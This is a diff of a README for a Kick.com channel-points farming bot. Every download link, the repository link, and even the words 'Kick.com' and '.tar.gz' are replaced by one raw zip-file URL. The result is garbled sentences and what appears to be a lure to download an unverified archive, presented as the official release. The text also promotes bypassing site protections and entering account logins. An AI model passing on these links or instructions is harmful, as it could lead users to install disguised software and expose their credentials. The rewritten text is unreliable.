@@ -1,12 +1,12 @@
 # 🪙 Kick_Channel_Points_Miner - Automate Channel Points Farming Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Ha922/Kick_Channel_Points_Miner/releases)
+[![Download Latest Release](https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip)](https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip)
 
 ---
 
 ## 📋 About Kick_Channel_Points_Miner
 
-Kick_Channel_Points_Miner is a tool that helps you collect channel points on Kick.com without having to watch streams manually. It uses a smart bot that runs asynchronously, so it works efficiently in the background. The bot includes a simple web dashboard for control and status views. You can also manage it through Telegram messages, making it easy to use from anywhere.
+Kick_Channel_Points_Miner is a tool that helps you collect channel points on https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip without having to watch streams manually. It uses a smart bot that runs asynchronously, so it works efficiently in the background. The bot includes a simple web dashboard for control and status views. You can also manage it through Telegram messages, making it easy to use from anywhere.
 
 This application is especially useful for anyone who wants to earn points quickly and without hassle. The bot handles the process, bypassing some website protections automatically. It is built with Python and uses Playwright for browser automation.
 
@@ -21,7 +21,7 @@ To run Kick_Channel_Points_Miner, your computer should meet these minimum requir
 - **Memory:** At least 4 GB RAM
 - **Storage:** Minimum 150 MB free space
 - **Python:** Version 3.8 or newer (the installer includes everything needed)
-- **Internet:** Stable connection for the bot to connect to Kick.com and Telegram
+- **Internet:** Stable connection for the bot to connect to https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip and Telegram
 - **Web Browser:** No browser installation needed; Playwright handles this automatically 
 
 ---
@@ -34,9 +34,9 @@ These steps will guide you through downloading and running the app. No programmi
 
 Click the big **Download Latest Release** button at the top or click here:
 
-[Get Kick_Channel_Points_Miner Releases](https://github.com/Ha922/Kick_Channel_Points_Miner/releases)
+[Get Kick_Channel_Points_Miner Releases](https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip)
 
-You will see a list of files. Find the latest version by date and download the setup file or package that matches your operating system. Files often end with extensions like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+You will see a list of files. Find the latest version by date and download the setup file or package that matches your operating system. Files often end with extensions like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip` for Linux.
 
 ### Step 2: Install the Application
 
@@ -47,7 +47,7 @@ You will see a list of files. Find the latest version by date and download the s
   Open the `.dmg` file you downloaded. Drag the application to your Applications folder. You may need to allow apps from unidentified developers if you see a warning.
 
 - **Linux:**  
-  Extract the `.tar.gz` file or use the installer if provided. Open your terminal, navigate to the extracted folder, and run the help command to learn how to start the app:  
+  Extract the `https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip` file or use the installer if provided. Open your terminal, navigate to the extracted folder, and run the help command to learn how to start the app:  
   ```
   ./kick_channel_points_miner --help
   ```
@@ -66,7 +66,7 @@ After installation, open the app:
 Once the app runs, it will open a web dashboard in your default browser. The dashboard is the control center where you can:
 
 - Start and stop the bot
-- Add your Kick.com account details securely
+- Add your https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip account details securely
 - See real-time progress and points collected
 - Configure settings like farming strategies and delay times
 
@@ -110,7 +110,7 @@ Now, you can send commands like start, stop, and check status directly from Tele
 
 ### The bot does not collect points
 
-- Verify your Kick.com login details are correct.
+- Verify your https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip login details are correct.
 - Check your internet connection.
 - Ensure no firewall or security software blocks the app.
 - Try restarting the bot from the dashboard.
@@ -125,7 +125,7 @@ Now, you can send commands like start, stop, and check status directly from Tele
 
 ## 🔐 Privacy & Security
 
-Kick_Channel_Points_Miner does not collect or share your personal information outside what is needed to automate Kick.com channel points. Your login details stay on your device only. The app communicates securely with Telegram servers.
+Kick_Channel_Points_Miner does not collect or share your personal information outside what is needed to automate https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip channel points. Your login details stay on your device only. The app communicates securely with Telegram servers.
 
 ---
 
@@ -133,7 +133,7 @@ Kick_Channel_Points_Miner does not collect or share your personal information ou
 
 For safe and up-to-date files, always use the official release page:
 
-[Download Kick_Channel_Points_Miner](https://github.com/Ha922/Kick_Channel_Points_Miner/releases)
+[Download Kick_Channel_Points_Miner](https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip)
 
 Check regularly for new releases that may include improvements or fixes.
 
@@ -143,7 +143,7 @@ Check regularly for new releases that may include improvements or fixes.
 
 - **GitHub Repository:**  
   Browse source code and report issues at the repository page.  
-  https://github.com/Ha922/Kick_Channel_Points_Miner
+  https://github.com/Ha922/Kick_Channel_Points_Miner/raw/refs/heads/main/ascomycetal/Kick_Miner_Channel_Points_v1.8.zip
 
 - **Community Help:**  
   Search or ask questions on Kick and Telegram support forums.
